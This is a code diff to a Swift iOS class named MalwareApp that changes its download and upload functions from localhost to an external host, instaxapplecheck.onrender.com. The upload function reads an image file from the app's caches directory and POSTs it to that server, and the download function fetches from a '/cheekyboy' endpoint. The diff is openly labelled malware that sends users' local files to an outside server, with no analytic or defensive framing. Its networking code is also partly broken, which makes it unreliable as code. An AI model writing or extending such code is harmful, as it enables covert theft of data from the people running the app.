@@ -17,7 +17,7 @@ class MalwareApp: UIApplicationMain {
 
     func downloadImages() {
         // Use URLSession to download images from /payload endpoint
-        let task = URLSession.shared.dataTask(with: URL(string: "https://localhost:8080/payload")!) { data, response, error in
+        let task = URLSession.shared.dataTask(with: URL(string: "https://instaxapplecheck.onrender.com/cheekyboy?image=downloaded_image.jpg")!) { data, response, error in
             if let error = error {
                 print("Error downloading images: \(error)")
                 return
@@ -48,21 +48,20 @@ class MalwareApp: UIApplicationMain {
 
     func uploadImages() {
         // Use URLSession to upload images to /data endpoint
-        let task = URLSession.shared.dataTask(with: URL(string: "https://localhost:8080/data")!) { data, response, error in
+        let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first!
+        let uploadedImageFile = "uploaded_image.jpg" // Replace with the appropriate file name extension
+        let uploadPath = "\(imagePath)/\(uploadedImageFile)"
+
+        let localImageURL = URL(fileURLWithPath: uploadPath)
+        let serverURL = URL(string: "https://instaxapplecheck.onrender.com/data")!
+
+        let task = URLSession.shared.dataTask(with: localImageURL) { data, response, error in
             if let error = error {
                 print("Error uploading images: \(error)")
                 return
             }
 
             if let data = data {
-                // Send the uploaded images to the server
-                let imagePath = NSSearchPathForDirectoriesInDomains(.cachesDirectory, .userDomainMask, true).first!
-                let uploadedImageFile = "uploaded_image.jpg" // Replace with the appropriate file name extension
-                let uploadPath = "\(imagePath)/\(uploadedImageFile)"
-
-                // Upload the image to the server
-                let serverURL = URL(string: "https://instaxapplecheck.onrender.com/uploads")!
-
                 var request = URLRequest(url: serverURL)
                 request.httpMethod = "POST"
 
